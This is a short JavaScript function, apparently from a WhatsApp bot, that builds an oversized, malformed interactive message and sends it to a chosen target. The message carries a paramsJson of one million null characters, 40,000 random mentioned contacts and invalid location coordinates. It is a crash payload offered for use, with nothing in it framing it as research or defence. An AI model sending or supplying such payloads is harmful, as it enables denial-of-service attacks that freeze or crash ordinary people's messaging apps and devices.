async function ExoCrashOS3(target) {
  try {
    const exosystem = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "💸 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗𝚇 𝙲𝚘𝚛𝚎𝚂𝚢𝚜𝚝𝚎𝚖 — 𝚉𝚊𝚔𝚛𝚎𝚗𝚣",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: "-55555",
                degreesLongitude: "55555",
                name: "[ # ] 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗𝚇 💸",
                address: "LocationX ExoCoreXs —"
              }
            },
            body: {
              text: "—͟͟͟͞͞͞𝐙𝐚͢𝐤𝐫͞𝐞͟𝐧𝐳 𝐄͢𝐱͞𝐨𝐂͢𝐨𝐫͞𝐞͟𝐗͢𝐬͞ "
            },
            footer: {
              text: "© —͟͟͟͞͞͞𝐙𝐚͢𝐤𝐫͞𝐞͟𝐧𝐳 𝐄͢𝐱͞𝐨𝐂͢𝐨𝐫͞𝐞͟𝐗͢𝐬͞💸"
            },
            nativeFlowResponseMessage: {
              name: "—͟͟͟͞͞͞𝐙𝐚͢𝐤𝐫͞𝐞͟𝐧𝐳 𝐄͢𝐱͞𝐨𝐂͢𝐨𝐫͞𝐞͟𝐗͢𝐬͞ ",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            },
            contextInfo: {
              participant: target,
              mentionedJid: Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            }
          }
        }
      }
    };

    await zakki.relayMessage(target, exosystem, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
  } catch (err) {
    console.error("ExoCrashOS3 Error:", err);
  }
            }
